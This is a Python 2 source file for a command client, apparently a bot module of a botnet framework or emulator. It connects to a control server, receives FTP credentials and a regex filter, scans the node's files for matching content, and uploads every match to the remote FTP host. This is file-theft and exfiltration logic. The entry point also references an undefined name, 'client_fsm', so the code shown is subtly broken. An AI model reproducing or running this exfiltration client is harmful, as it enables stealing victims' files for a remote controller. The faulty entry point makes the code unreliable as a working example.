#!/usr/bin/env python
# ClientCommand
import core

client_desc = {
        'initial' : 'disconn',
        'start_action' : 'request_connect',
        'srv_addr':'127.0.0.1',
        # 'srv_addr':'10.0.0.0',
        'srv_port':3333,
        'request_timeout':10,
        }

import re
class ClientCMD(core.ClientCMD):
    # """this CMD requires nodes to provide a linux like command system"""
    def __init__(self, desc=client_desc):
        core.ClientCMD.__init__(self, desc)

    def set_ftp_info(self, sock, data):
        """set the ftp info that the client will upload the data to"""
        self.logger.debug('set_ftp_info, receive data, %s'%(data))
        self.ftp_info = data

    def set_file_filter(self, sock, data):
        print '------------------------------'
        print 'set_file_filter'
        self.logger.debug('set_file_filter, receive data, %s'%(data))
        self.file_filter = data

    def search_and_upload(self, sock, data):
        interesting_files = self._search_files(**self.file_filter)
        for f in interesting_files:
            self.upload_file(f)

    def _search_files(self, pattern, suffix):
        """search files in the machine with possible string pattern"""
        file_list = self.node.get_file_list()
        interesting_files = [f for f in file_list if self._check_file(f, pattern)]
        return interesting_files

    def _check_file(self, f, pattern):
        """check whether a file meets the pattern"""
        f_content = self.node.load_file(f)
        return True if re.search(pattern, f_content) else False

    def upload_file(self, f):
        self.node.ftp_upload(f, **self.ftp_info)

if __name__ == "__main__":
    cmd = ClientCMD(client_fsm)
    node = core.PhyNode()
    cmd.install(node)
    node.start()
    pass
